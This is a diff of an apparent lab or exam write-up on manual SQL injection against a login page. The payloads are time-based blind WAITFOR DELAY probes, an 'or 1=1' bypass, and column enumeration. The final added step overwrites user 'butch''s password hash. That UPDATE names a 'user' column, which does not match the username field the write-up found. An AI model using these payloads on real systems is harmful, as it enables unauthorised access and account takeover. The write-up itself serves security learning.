@@ -80,14 +80,14 @@ OS and Service detection performed. Please report any incorrect results at https
 I find the website that runs on port 450 has SQL injection vulnerability by using the waiting test.
 
 ```SQL
-'; WAITFOR DELAY '00:00:10' ; --
+'; WAITFOR DELAY '00:00:10'; --
 ```
 ![image](1)
 
 Attempts to log in using the usernames ```admin``` and ```administrator``` failed.
 
 ```SQL
-' or 1=1  ; --
+' or 1=1; --
 ```
 
 ![image](2)
@@ -97,19 +97,19 @@ Because we can't use automatic exploitation tools in the exam, I start doing it 
 First, we must know the name of the field.
 
 ```SQL
-' HAVING 1=1 --
+' HAVING 1=1; --
 ```
 
 ![image](3)
 
 ```SQL
-' GROUP BY users.username HAVING 1=1 --
+' GROUP BY users.username HAVING 1=1; --
 ```
 
 ![image](4)
 
 ```SQL
-' GROUP BY users.username, users.password_hash HAVING 1=1 --
+' GROUP BY users.username, users.password_hash HAVING 1=1; --
 ```
 
 ![image](5)
@@ -119,20 +119,29 @@ Now we know that the data table users has two fields username and password_hash.
 Check how many data are in the data table users. We can see from the query below that there is only one data.
 
 ```SQL
-'; IF (SELECT COUNT(*) FROM users) = 1 WAITFOR DELAY '00:00:05' --
+'; IF (SELECT COUNT(*) FROM users) = 1 WAITFOR DELAY '00:00:05'; --
 ```
 Finding the username ```butch```.
 
 ```SQL
 -- e.g. guess username (ASCII)
-'; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 97) WAITFOR DELAY '00:00:05' --
-'; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 98) WAITFOR DELAY '00:00:05' -- and so on
+'; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 97) WAITFOR DELAY '00:00:05'; --
+'; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 98) WAITFOR DELAY '00:00:05'; -- and so on
 ```
 
 Guessing the length of the password by the command below.
 
 ```SQL
-'; IF (SELECT LEN(password_hash) FROM users) > 10 WAITFOR DELAY '00:00:05' -- and so on
+'; IF (SELECT LEN(password_hash) FROM users) > 10 WAITFOR DELAY '00:00:05'; -- and so on
 ```
 
-Finally, we know that the password length is 64, so it may have been hashed.
+Finally, we know that the password length is 64, so it may have been hashed. Because of the length of the password so I guessed that may use SHA-256 hash.
+
+![image](6)
+
+Now we update the password.
+
+```SQL
+'; UPDATE users SET password_hash = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WHERE user = 'butch'; -- 123456
+'; IF (SELECT TOP 1 password_hash FROM users) = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WAITFOR DELAY '00:00:05'; -- check if update is successful
+```
